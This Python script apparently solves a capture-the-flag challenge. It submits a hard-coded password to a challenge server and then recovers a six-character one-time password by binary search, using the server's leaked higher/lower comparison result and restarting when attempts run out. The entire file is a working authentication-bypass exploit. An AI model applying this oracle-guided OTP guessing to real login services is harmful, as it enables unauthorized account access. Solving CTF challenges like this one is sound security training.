import requests

ALPHABET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
OTP_GUID = None

def submit_password():
    global OTP_GUID

    password = "MonkeyBrain"
    res = requests.post("http://paranoid.challenges.cybersecuritychallenge.be/validate", json={"password": password})
    if res.status_code != 200:
        print("[!] Failed to submit password")
        return

    OTP_GUID = res.json()["message"]


def submit_otp(curr="", alphabet_state=ALPHABET):
    global OTP_GUID

    if OTP_GUID is None:
        print("Run submit_password() first")
        return
    print("")

    if len(curr) >= 6:
        print(f"[?] Umm did an error occur? Maybe OTP: {curr}")
        return False

    otp = curr + alphabet_state[len(alphabet_state)//2]
    print(f"[*] Attempting OTP: {otp} (State: {alphabet_state})")
    res = requests.post(f"http://paranoid.challenges.cybersecuritychallenge.be{OTP_GUID}", json={ "otp": otp })

    if res.status_code == 200:
        print(f"[*] Found OTP: {otp}")
        print(f"[*] Flag: {res.json()['message']}")
        return False

    if res.status_code == 404:
        print("[!] Ran out of attempts, starting over...")
        return True

    if res.status_code != 401:
        print(f"[!] An error ocurred, OTP: {otp}")
        return False

    data = res.json()
    print(f"[!] {data['message']}: {data['result']}")

    new_alphabet_state = alphabet_state[:len(alphabet_state)//2] if data["result"] == -1 else alphabet_state[len(alphabet_state)//2:]
    if len(new_alphabet_state) >= 2:
        return submit_otp(curr, new_alphabet_state)
    else:
        return submit_otp(curr + new_alphabet_state[0], ALPHABET)



def main():
    global OTP_GUID
    keep_going = True

    while keep_going:
        submit_password()
        print(f"Got GUID: {OTP_GUID}")
        keep_going = submit_otp()

if __name__ == "__main__":
    main()